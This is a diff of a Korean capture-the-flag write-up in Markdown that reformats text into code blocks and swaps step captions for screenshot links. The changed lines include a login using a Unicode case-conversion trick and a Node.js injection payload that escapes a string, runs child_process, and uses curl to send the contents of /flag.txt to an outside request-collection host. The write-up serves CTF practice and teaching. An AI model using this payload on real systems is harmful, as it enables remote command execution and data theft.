@@ -112,10 +112,10 @@ https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/
 
  
 
-
+```
 ID : B%C4%B1%c5%bfC2023
 PW : TeamH4C
- 
+```
 
  
 
@@ -127,8 +127,7 @@ PW : TeamH4C
 
  
 
-웹페이지 접속 (1)
-공격 과정 (1)
+![image](./image/biscboard8.png)
  
 
  
@@ -137,14 +136,11 @@ PW : TeamH4C
 
  
 
-웹페이지 접속 (1)
-공격 과정 (2)
+![image](./image/biscboard9.png)
  
 
- 
 
-웹페이지 접속 (1)
-공격 과정 (3)
+![image](./image/biscboard10.png)
  
 
  
@@ -157,13 +153,14 @@ PW : TeamH4C
 
  
 
-
+```
 // curl 다음에 입력된 주소는 Request Bin 주소이며 사람에 따라 이 주소는 다를 수 있음.
 ');process.mainModule.constructor._load('child_process').exec('curl https://eodnnmy.request.dreamhack.games/$(cat /flag.txt)');_=('
- 
+``` 
 
-웹페이지 접속 (1)
-공격 과정 (4)
+
+
+![image](./image/biscboard11.png)
  
 
  
@@ -172,21 +169,17 @@ PW : TeamH4C
 
  
 
-웹페이지 접속 (1)
-공격 과정 (5)
+![image](./image/biscboard12.png)
+ 
+
+
+
+![image](./image/biscboard13.png)
  
 
  
 
- 
-
-웹페이지 접속 (1)
-공격 과정 (6)
- 
-
- 
-
-5. Reference
+<h1>5. Reference</h1>
  
 
 - https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/
